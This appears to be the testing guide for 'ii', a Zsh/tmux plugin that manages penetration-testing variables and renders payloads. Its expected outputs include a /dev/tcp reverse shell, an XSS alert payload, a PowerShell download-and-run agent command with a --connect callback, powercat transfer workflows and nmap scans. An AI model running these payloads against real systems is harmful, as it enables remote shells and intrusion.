# Testing

All commands below are intended to be run from the project root.

## Test Structure

The repository keeps three intentionally different test layers:

```text
src/**/*_test.go          combo-domain and retained adapter tests
test/contract/            current Zsh public, architecture, and tmux contracts
ori-ii/script/test-*      frozen pre-Go compatibility baseline
```

Go unit tests cover only the combo helper and the temporary tmux popup support.

Contract tests exercise process boundaries and durable effects that unit tests
cannot represent, including Zsh dispatch, isolated
tmux servers, popup terminal input, and fzf-driven selection. They are not
duplicates of the Go tests.

Do not remove a frozen `ori-ii` test merely because a Go or root contract covers
the same feature. It remains the executable comparison baseline until the
legacy runtime is removed. Files under generated `build/` and `export/`
directories are not test sources.

## Current Runtime Baseline

Use these root targets:

```zsh
make test
make test-entry-tmux
make test-variables-tmux
make test-variable-output-tmux
make test-variable-mutations-tmux
make test-set-tmux
make test-unset-all-tmux
make test-load-all-tmux
make test-get-tmux
make test-clipboard-tmux
make test-tmux-status
make test-payload-input-usage-tmux
make test-tmux-install
make test-tmux-popup
make test-tmux-popup-interactive
make cross-build
make
```

`make test` runs format, vet, Go unit tests, shared render/routing/combo
architecture contracts, a static build, and public Zsh compatibility checks.
The tmux targets use isolated servers to verify Zsh variable behavior, native
alias installation/status, popup execution, and real heredoc/interactive
`ii pic` and `ii pice` input. A
bare `make` creates the current deployment package under `export/ii`.

Current feature ownership and known coverage gaps are tracked in
[`feature-inventory.md`](feature-inventory.md).

Run the immutable legacy baseline separately:

```zsh
make test-legacy
make test-legacy-tmux
./ori-ii/script/make
```

The remaining legacy procedures below describe the contract captured under
`ori-ii/`. Until each section receives a root contract equivalent, run its
commands from `ori-ii/`, not from repository root.

## Syntax Check

Run from repo root:

```zsh
zsh -n ii.plugin.zsh
zsh -n lib/*.zsh
```

## Local Plugin Load Check

This does not require tmux:

```zsh
zsh -fc 'source ./ii.plugin.zsh && type ii && ii p --help >/dev/null && print $II_PAYLOAD_DIR'
```

Expected result:

```text
ii is a shell function
<project-root>/payloads
```

## ANSI Color Policy

Run the shared color regression:

```zsh
./script/test-color
```

It verifies plain auto-mode output in a non-TTY stream, forced ANSI output,
`II_COLOR=never`, the standard `NO_COLOR` override, invalid-mode fallback to
auto, and ANSI-aware selector output.

The help audit also verifies that forced color affects only actual alias names
inside `Aliases:` sections and that `NO_COLOR` restores byte-for-byte plain
help output.

## Help Audit

Check every feature-registered help topic and verify that short help flags do
not enter normal command execution:

```zsh
zsh -fc 'source ./ii.plugin.zsh; for command in "get -h" "load -h" "interactive -h" "ls -h" "payload -h" "unset -h" "version -h" "p --input -h"; do ii ${(z)command} >/dev/null || exit; done'
zsh -fc 'source ./ii.plugin.zsh; ii help pic | grep -Fq "ii pic [-o [PATH]]"'
zsh -fc 'source ./ii.plugin.zsh; ii help pe | grep -Fq "ii pe [KEYWORD ...]"'
zsh -fc 'source ./ii.plugin.zsh; ii help pce | grep -Fq "ii pce [KEYWORD ...]"'
zsh -fc 'source ./ii.plugin.zsh; ii help pie | grep -Fq "ii pie"'
zsh -fc 'source ./ii.plugin.zsh; ii help pice | grep -Fq "ii pice"'
zsh -fc 'source ./ii.plugin.zsh; ii help tmux | grep -Fq "ii tmux status"'
zsh -fc 'source ./ii.plugin.zsh; ii help pc | grep -Fq "ii pc [KEYWORD ...]"'
zsh -fc 'source ./ii.plugin.zsh; ii help sr | grep -Fq "ii sr VALUE"'
zsh -fc 'source ./ii.plugin.zsh; ii v --help | grep -Fq "ii v --out [PATH]"'
zsh -fc 'source ./ii.plugin.zsh; ii help vo | grep -Fq "ii vo [PATH]"'
zsh -fc 'source ./ii.plugin.zsh; ii help voc | grep -Fq "ii voc [PATH]"'
zsh -fc 'source ./ii.plugin.zsh; ii la --help | grep -Fq "likely ready"'
```

Each command must return zero without requiring tmux, fzf, a source path, or a
configured web root. `make test-contract` compares public help output, status,
and streams with the frozen baseline while it remains available. Go resolution
tests must cover every direct alias and nested help path. Once an intentionally
removed route such as `sync` is dropped, replace its differential expectation
with an explicit unknown-command contract.

## Interactive Payload Input

Run `ii pic` in a terminal and verify the status line remains below the edit
buffer:

```text
Enter Finish    Alt-Enter New line    Esc Cancel
```

Type `first`, press Alt+Enter, type `second`, and press Enter. The rendered and
copied body must contain two lines. Enter submits; Alt+Enter inserts a newline;
Esc cancels. Entering `:q` or `:q!` as the complete buffer also cancels.
Interactive cancellation returns status 130; the tmux popup treats it as a
normal user cancellation and closes without entering preview or sending input.

The non-interactive protocol remains available for pipelines:

```zsh
printf 'first\nsecond\n:w\n' | ii pic
echo 'single line' | ii pic
ii pic <<'EOF'
first
second
EOF
```

The pipe and here-document forms must read through EOF, render the complete
standard input, and copy it without opening the interactive ZLE editor.

## Payload Execute Routing

In the payload selector, verify that normal-mode `e` confirms, executes, and
closes, while Enter only renders. With `ii p --execute` or `ii pe`, Enter
confirms and executes instead. `ii p --copy --execute` and `ii pce` must copy
after confirmation and before execution.
Execution occurs in the current shell, so this payload must leave both changes
visible after the selector closes:

```text
typeset -g II_EXEC_TEST=ok; cd /tmp
```

Multiple keywords initialize one fzf query:

```zsh
ii p power shell reverse
ii p --execute power shell reverse
ii pe power shell reverse
ii pce power shell reverse
```

For input execution, verify that `ii pie` accepts no arguments, renders input,
requires `[y/N]`, never copies, and executes in the current shell. Verify that
`ii pice` retains copy-before-execute behavior. Clipboard failure must be
reported without preventing confirmed `pice` execution.

## Tmux Popup Input Execution

Run the automatic isolated integration regression:

```zsh
./script/test-tmux-integration
./script/test-tmux-input
```

Loading the plugin inside tmux must add a server-wide native command alias named
`ii` without changing the `Prefix + :` binding. Entering `ii` in tmux's command
prompt must open an isolated popup. The popup path is:

```text
popup input -> tmux-only render -> preview and [y/N] -> originating pane -> Enter
```

Paste input into the popup, use Alt+Enter for manual newlines, and press Enter
to render. Verify that the
originating pane receives no input before `y`, that unresolved lowercase
variables remain unchanged and produce an execute-anyway warning, and that
uppercase variables do not produce that warning. Repeated plugin loads must be
silent and idempotent. `II_TMUX_INTEGRATION=0` must not install the alias. A
user-defined command alias named `ii` must be preserved with one conflict
notice unless `II_TMUX_INTEGRATION_FORCE=1` is set. Other aliases and the
`Prefix + :` binding must remain unchanged. `ii tmux status` must remain
read-only.
If buffer creation, paste, or the final Enter fails, the popup must remain open
and show the failed stage.

## Payload Selector Copy

`ii pc` and `ii p --copy` open the selector. Both join all keywords into its
initial query and require `y` on the reviewed selection:

```zsh
ii pc power shell reverse
ii p --copy power shell reverse
```

They may be called without keywords. No selection, render failure, or clipboard
failure returns nonzero.

## Executable Combo Workflows

Run the deterministic parser, render, staged-copy, and assignment-state tests:

```zsh
./script/test-workflow-parser
./script/test-workflow
./script/test-workflow-tmux
```

Every file under `payloads/script/combo/` must classify as a valid workflow.
The transfer fixtures under `trans/` must additionally remain two-stage,
two-lane workflows:

```zsh
zsh -fc 'source ./ii.plugin.zsh; for f in payloads/script/combo/**/*(.); do ii_workflow_classify "$f" || exit; [[ "$II_WORKFLOW_CLASS" == workflow ]] || exit; done'
```

For a first manual test, separate the UI/routing check from an actual file
transfer:

1. Start a fresh tmux session with two panes and load `ii.plugin.zsh` in the
   operator pane.
2. Set the values required by the selected combo:

   ```zsh
   ii s lhost 192.0.2.10
   ii s rhost 192.0.2.20
   ii s lport 4444
   ii s rport 4444
   ii s file /tmp/combo-flow-test.txt
   ```

3. Run `ii pe powercat-K2T-TLKC`. In the assignment popup, verify lane-to-pane
   mapping, reassignment, and cancellation first. Decline stage confirmation to
   finish this UI-only pass without sending a command.
4. For the end-to-end pass, replace the example addresses and file path with
   reachable test-system values, ensure PowerShell has `powercat`, and rerun the
   same combo. Confirm the listener stage before the connector stage.

The `192.0.2.0/24` addresses above are documentation-only examples; they are
not expected to be reachable. Use a disposable file and test target for the
end-to-end pass.

Inside an isolated tmux session, select a powercat combo with `e`. Verify the
popup preassigns `kali-transfer` and `remote-transfer`, displays each assignment
above its pane rectangle, supports Space and direct `1`/`2` reassignment with
swap, and accepts only a complete distinct assignment with Enter. Escape and
`q` must send nothing. A later run in the same session should label confirmed
targets `remembered` while still requiring Enter.

Confirm stages in order and verify only the pinned destination receives each
body. Changing pane title, foreground command, window, or layout must not abort.
Killing a pinned pane must abort before the pending stage with no substitution.

## Payload Category Filter Check

This verifies that `script` is a supported payload category and dotfiles used to
keep empty directories are not shown as payload entries.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_payload_list | grep -q "^script/.gitkeep$" && print bad || print ok'
zsh -fc 'source ./ii.plugin.zsh; print script/custom | ii_payload_filter script'
zsh -fc 'source ./ii.plugin.zsh; rendered="$(ii_payload_render payloads/script/tool/nmap/nmap)"; print -r -- "$rendered" | grep -Fq "sudo nmap -p- -Pn -T4 \"\$rhost\"" && print ok'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_preview script/tool/nmap/nmap | grep -Fq "sudo nmap -p- -Pn -T4 \"\$rhost\"" && print ok'
```

Expected result:

```text
ok
script/custom
ok
ok
```

## Lowercase Payload Render Test

This verifies that normal payload rendering replaces lowercase `%name%`,
`$name`, `${name}`, and `${name:t}` placeholders from tmux while leaving
uppercase and legacy `II_NAME` forms unchanged.

```zsh
tmux kill-session -t codex-ii-lower-payload 2>/dev/null || true
tmux new-session -d -s codex-ii-lower-payload -x 120 -y 30 zsh
tmux send-keys -t codex-ii-lower-payload "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-lower-payload "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-lower-payload "ii s rhost 10.10.10.20" Enter
tmux send-keys -t codex-ii-lower-payload "ii_payload_render payloads/script/tool/nmap/nmap" Enter
sleep 2
tmux capture-pane -t codex-ii-lower-payload -p -S -80
tmux kill-session -t codex-ii-lower-payload
```

Expected sign:

```text
sudo nmap -p- -Pn -T4 10.10.10.20
```

Expected script copy sign:

```text
sudo nmap -p- -Pn -T4 $rhost
```

## Single Pane tmux Smoke Test

Run from outside or inside tmux. It creates an isolated session named
`codex-ii-test`.

```zsh
tmux kill-session -t codex-ii-test 2>/dev/null || true
tmux new-session -d -s codex-ii-test -x 120 -y 40 zsh
tmux send-keys -t codex-ii-test "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-test "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-test "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-ii-test "ii s LPORT 4444" Enter
tmux send-keys -t codex-ii-test "ii s DOMAIN example.test" Enter
tmux send-keys -t codex-ii-test "ii ls" Enter
tmux send-keys -t codex-ii-test "ii ls host" Enter
tmux send-keys -t codex-ii-test "ii l" Enter
tmux send-keys -t codex-ii-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-test -p -S -200
tmux kill-session -t codex-ii-test
```

Expected payload:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1
```

Expected render report:

```text
lhost used from shell: 127.0.0.1
lport used from shell: 4444
```

## Cross Pane tmux Test

This verifies that `ii p` falls back to tmux session values when the rendering
pane has not run `ii l`.

```zsh
tmux kill-session -t codex-ii-crosspane 2>/dev/null || true
tmux new-session -d -s codex-ii-crosspane -x 120 -y 40 zsh
tmux split-window -t codex-ii-crosspane zsh
tmux send-keys -t codex-ii-crosspane:0.0 "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-ii-crosspane:0.0 "ii s LPORT 9001" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "echo pane2-shell-before:\$LHOST" Enter
tmux send-keys -t codex-ii-crosspane:0.1 "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-crosspane:0.1 -p -S -120
tmux kill-session -t codex-ii-crosspane
```

Expected signs:

```text
pane2-shell-before:
/bin/sh -i >/dev/tcp/10.10.10.10/9001 2>&1 0>&1
lhost used from ii: 10.10.10.10
lport used from ii: 9001
```

## Payload Missing Variable Preservation Test

This verifies that missing payload variables keep their original token and are
reported as unresolved instead of blocking render/output.

```zsh
tmux kill-session -t codex-ii-payload-fallback 2>/dev/null || true
tmux new-session -d -s codex-ii-payload-fallback -x 120 -y 30 zsh
tmux send-keys -t codex-ii-payload-fallback "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-payload-fallback "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-payload-fallback "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-payload-fallback "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-ii-payload-fallback "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-payload-fallback -p -S -140
tmux kill-session -t codex-ii-payload-fallback
```

Expected signs:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/${lport} 2>&1 0>&1
lhost used from shell: 127.0.0.1
lport unresolved: kept as ${lport}
```

## Special Character Copy Test

This verifies that `y` copies the rendered payload through stdin, closes the
selector, and does not break common shell metacharacters.

```zsh
tmux kill-session -t codex-ii-special 2>/dev/null || true
tmux new-session -d -s codex-ii-special -x 120 -y 40 zsh
tmux send-keys -t codex-ii-special "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-special "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-special "ii s DOMAIN \"a b/c;whoami & test\"" Enter
tmux send-keys -t codex-ii-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_PAYLOAD_KEY=y II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
sleep 2
tmux capture-pane -t codex-ii-special -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-special
```

Expected buffer:

```text
<script>alert('a b/c;whoami & test')</script>
```

## Input Render Test

This verifies the non-interactive `ii p --input` protocol: lowercase variables
render, uppercase and PowerShell scope variables remain unchanged, `:w` stops
input, and `--copy` copies only the rendered body.

```zsh
tmux kill-session -t codex-ii-input 2>/dev/null || true
input_file="$(mktemp)"
printf '%s\n' \
  '$KALI = "$lhost"' \
  '$FILE = "${file:t}"' \
  'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' \
  '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' \
  ':w' > "$input_file"
tmux new-session -d -s codex-ii-input -x 160 -y 60 zsh
tmux send-keys -t codex-ii-input "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-input "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-input "ii s lhost 10.10.14.7" Enter
tmux send-keys -t codex-ii-input "file=/tmp/drop/agent.exe" Enter
tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p --input --copy < ${(q)input_file}" Enter
sleep 2
tmux capture-pane -t codex-ii-input -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-input
rm -f "$input_file"
```

Expected buffer:

```text
$KALI = "10.10.14.7"
$FILE = "agent.exe"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
& "$env:TEMP\$FILE" --connect :11601 -selfcert
```

## Payload Output Path Test

This verifies rendered payload output path resolution.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ""'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path filename'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./payload.txt'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path /tmp/payload.txt'
```

Expected output:

```text
/www/p/att.txt
/www/filename
./att.txt
./payload.txt
/tmp/payload.txt
```

## OSC52 Sequence Test

This verifies that the OSC52 backend encodes special-character payload text
without shell escaping loss. It does not prove that the local terminal accepts
OSC52 clipboard writes.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_clip_osc52_sequence "a b/c;whoami & test" | base64 | tr -d "\n"'
```

Expected sign:

```text
G101MjtjO1lTQmlMMk03ZDJodllXMXBJQ1lnZEdWemRBPT0H
```

## Variable Guard Test

```zsh
tmux kill-session -t codex-ii-vars 2>/dev/null || true
tmux new-session -d -s codex-ii-vars -x 120 -y 30 zsh
tmux send-keys -t codex-ii-vars "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-vars "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-vars "ii s GOOD_NAME ok" Enter
tmux send-keys -t codex-ii-vars "ii ls good" Enter
tmux send-keys -t codex-ii-vars "ii unset GOOD_NAME" Enter
tmux send-keys -t codex-ii-vars "ii ls good" Enter
tmux send-keys -t codex-ii-vars "ii set 'BAD-NAME' value" Enter
sleep 2
tmux capture-pane -t codex-ii-vars -p -S -100
tmux kill-session -t codex-ii-vars
```

Expected signs:

```text
GOOD_NAME=ok
unset GOOD_NAME
ii: invalid variable name: BAD-NAME
```

## Unset All Test

```zsh
tmux kill-session -t codex-ii-unset-all 2>/dev/null || true
tmux new-session -d -s codex-ii-unset-all -x 120 -y 30 zsh
tmux send-keys -t codex-ii-unset-all "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-unset-all "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-unset-all "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-ii-unset-all "ii s USER1=alice" Enter
tmux send-keys -t codex-ii-unset-all "printf 'n\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
tmux send-keys -t codex-ii-unset-all "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
sleep 2
tmux capture-pane -t codex-ii-unset-all -p -S -160
tmux kill-session -t codex-ii-unset-all
```

Expected signs:

```text
aborted
lhost=192.0.2.10
user1=alice
unset lhost
unset user1
unset 2 variable(s)
```

## Variable View Test

```zsh
tmux kill-session -t codex-ii-views 2>/dev/null || true
tmux new-session -d -s codex-ii-views -x 120 -y 35 zsh
tmux send-keys -t codex-ii-views "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-views "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-views "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-ii-views "ii s RHOST 198.51.100.20" Enter
tmux send-keys -t codex-ii-views "ii s LPORT 4444" Enter
tmux send-keys -t codex-ii-views "ii s USER1=alice" Enter
tmux send-keys -t codex-ii-views "ii s PASS1=secret" Enter
tmux send-keys -t codex-ii-views "ii s PASS2=deadbeef" Enter
tmux send-keys -t codex-ii-views "ii ls host" Enter
tmux send-keys -t codex-ii-views "ii ls user" Enter
tmux send-keys -t codex-ii-views "ii ls pass" Enter
sleep 2
tmux capture-pane -t codex-ii-views -p -S -160
tmux kill-session -t codex-ii-views
```

Expected signs:

```text
lhost
192.0.2.10
rhost
198.51.100.20
lport
4444
user1
alice
pass1
secret
pass2
deadbeef
```

## Lowercase Input And Load Test

This verifies that lowercase input maps to the same tmux variable as uppercase
input, and that unset default names are not loaded into the shell.

```zsh
tmux kill-session -t codex-ii-case 2>/dev/null || true
tmux new-session -d -s codex-ii-case -x 120 -y 30 zsh
tmux send-keys -t codex-ii-case "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-case "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-case "ii s user2=bob" Enter
tmux send-keys -t codex-ii-case "unset USER2 user2 PASS2 pass2" Enter
tmux send-keys -t codex-ii-case "ii l" Enter
tmux send-keys -t codex-ii-case "echo user2:\$USER2/\$user2 pass2:\${PASS2-unset}/\${pass2-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-case -p -S -100
tmux kill-session -t codex-ii-case
```

Expected signs:

```text
user2=bob
loaded 1 variable(s)
user2:/bob pass2:unset/unset
```

## Set Shortcut And Edit Test

This verifies that CLI shortcut names and the interactive edit flow all target
`RHOST`.

```zsh
tmux kill-session -t codex-ii-keys 2>/dev/null || true
tmux new-session -d -s codex-ii-keys -x 120 -y 40 zsh
tmux send-keys -t codex-ii-keys "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-keys "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-keys "ii s r 10.0.0.5" Enter
tmux send-keys -t codex-ii-keys "ii s:r 10.0.0.6" Enter
tmux send-keys -t codex-ii-keys "II_EDIT_VALUE_FILTER=10.0.0.8 ii_cmd_interactive_edit_variable RHOST" Enter
tmux send-keys -t codex-ii-keys "ii ls host" Enter
sleep 3
tmux capture-pane -t codex-ii-keys -p -S -200
tmux show-buffer
tmux kill-session -t codex-ii-keys
```

Expected signs:

```text
rhost=10.0.0.5
rhost=10.0.0.6
rhost=10.0.0.8
```

## CLI-only Set Validation

This verifies that `ii s` no longer enters an interactive selector and that a
name without a value is rejected.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii s >/dev/null; test $? -eq 2'
zsh -fc 'source ./ii.plugin.zsh; ii s rhost >/dev/null 2>&1; test $? -eq 2'
```

Both commands must return zero because the rejected `ii s` invocation returned
status 2 as expected. Neither check requires tmux or fzf.

## Get Filter Match Test

This verifies `ii g FILTER` handling for one match, multiple matches, and abort.
It should copy and print selected values; abort should not copy anything.

```zsh
tmux kill-session -t codex-ii-get 2>/dev/null || true
tmux new-session -d -s codex-ii-get -x 120 -y 35 zsh
tmux send-keys -t codex-ii-get "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-get "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-get "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-ii-get "ii s RHOST 10.10.10.20" Enter
tmux send-keys -t codex-ii-get "II_CLIP_CMD='tmux load-buffer -' ii g l" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=RHOST' II_CLIP_CMD='tmux load-buffer -' ii g host" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=nomatch' ii g host; print abort:\$?" Enter
sleep 2
tmux capture-pane -t codex-ii-get -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-get
```

Expected signs:

```text
value copied successfully
10.10.10.10
10.10.10.20
abort:1
```

## Clipboard Backend Command Test

This verifies clipboard backend inspection and tmux-session scoped backend
settings.

```zsh
tmux kill-session -t codex-ii-clip 2>/dev/null || true
tmux new-session -d -s codex-ii-clip -x 120 -y 30 zsh
tmux send-keys -t codex-ii-clip "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-clip "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-clip "ii clip backend xclip-both" Enter
tmux send-keys -t codex-ii-clip "unset II_CLIP_BACKEND II_CLIP_CMD; ii clip backend" Enter
tmux send-keys -t codex-ii-clip "ii clip backend auto" Enter
sleep 2
tmux capture-pane -t codex-ii-clip -p -S -100
tmux kill-session -t codex-ii-clip
```

Expected signs:

```text
clipboard backend: xclip-both
backend: xclip-both
clipboard backend: auto
```

## Interactive Variable Copy Test

This uses fzf filter mode to verify that `ii i` copies selected variable values
with case-insensitive search. It should not load variables into the shell.

```zsh
tmux kill-session -t codex-ii-i 2>/dev/null || true
tmux new-session -d -s codex-ii-i -x 120 -y 30 zsh
tmux send-keys -t codex-ii-i "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-i "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-i "ii s LHOST 172.16.1.10" Enter
tmux send-keys -t codex-ii-i "unset LHOST lhost ii_lhost" Enter
tmux send-keys -t codex-ii-i "FZF_DEFAULT_OPTS='--filter=lhost' II_INTERACTIVE_KEY=y II_CLIP_CMD='tmux load-buffer -' ii i" Enter
tmux send-keys -t codex-ii-i "echo loaded:\$LHOST/\$lhost" Enter
sleep 2
tmux capture-pane -t codex-ii-i -p -S -100
tmux show-buffer
tmux kill-session -t codex-ii-i
```

Expected signs:

```text
copied lhost
loaded:/
```

## Interactive Ordering Test

This verifies that populated variables are listed before empty default names in
the `ii i` selector source.

```zsh
tmux kill-session -t codex-ii-i-order 2>/dev/null || true
tmux new-session -d -s codex-ii-i-order -x 120 -y 30 zsh
tmux send-keys -t codex-ii-i-order "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-i-order "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-i-order "ii s rhost 10.0.0.8" Enter
tmux send-keys -t codex-ii-i-order "ii s usert=alice" Enter
tmux send-keys -t codex-ii-i-order "ii_var_entries_for_fzf | head -n 5" Enter
sleep 2
tmux capture-pane -t codex-ii-i-order -p -S -100
tmux kill-session -t codex-ii-i-order
```

Expected signs:

```text
rhost
usert
domain
```

The empty default candidates must be exactly `domain`, `lhost`, `rhost`,
`lport`, `rport`, `user1` through `user5`, `pass1` through `pass5`, `cuser`,
`cpass`, `tuser`, `tpass`, and `directs`, minus any names already populated.
`file`, `usert`, `passt`, and `mm` must not appear as empty defaults; they
remain valid explicitly created variable names.

## Set All Defaults From Shell Test

Inside tmux, define a mixture of lowercase, uppercase, empty, removed-default,
and unrelated shell variables, then run `ii s --from-shell -a` and its `ii sha`
alias. Verify that ii
prefers non-empty lowercase values, falls back to uppercase, prints every saved
default, skips empty values without warnings, and does not import removed or
arbitrary names.

The default-name source for this test is `ii_var_default_names`; it must include
`directs` and exclude `file`, `usert`, `passt`, and `mm`.

## Set From File Test

Inside tmux, create a dotenv file containing blank lines, comments, optional
`export ` prefixes, quoted values, and one malformed line. Run
`ii s --from-file PATH` and its `ii sf PATH` alias, and verify that valid values are printed, stored in
tmux, and exported into the current shell while the malformed line is reported
on stdout. Also verify that `ii s --from-file` defaults to `.env` and that a
missing explicit or default file prints `ii: variable file not found` on
stdout.

## Interactive Add Variable Test

This verifies that `ii i` can create a new variable through the final add
option, and that empty values are stored but skipped by `ii l`.

```zsh
tmux kill-session -t codex-ii-add 2>/dev/null || true
tmux new-session -d -s codex-ii-add -x 120 -y 35 zsh
tmux send-keys -t codex-ii-add "cd \"${PWD}\"" Enter
tmux send-keys -t codex-ii-add "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=token II_ADD_VALUE_FILTER=abc123 ii i" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=emptytest II_ADD_VALUE_FILTER= ii i" Enter
tmux send-keys -t codex-ii-add "unset TOKEN token EMPTYTEST emptytest" Enter
tmux send-keys -t codex-ii-add "ii l" Enter
tmux send-keys -t codex-ii-add "echo token:\$TOKEN/\$token empty:\${EMPTYTEST-unset}/\${emptytest-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-add -p -S -140
tmux kill-session -t codex-ii-add
```

Expected signs:

```text
TOKEN=abc123
EMPTYTEST=
loaded 1 variable(s)
token:abc123/abc123 empty:unset/unset
```

## Manual Interactive Test

Inside an existing tmux session:

```zsh
source ./ii.plugin.zsh

ii s LHOST 192.168.45.192
ii s LPORT 443
ii ls
ii i
ii p linux
```
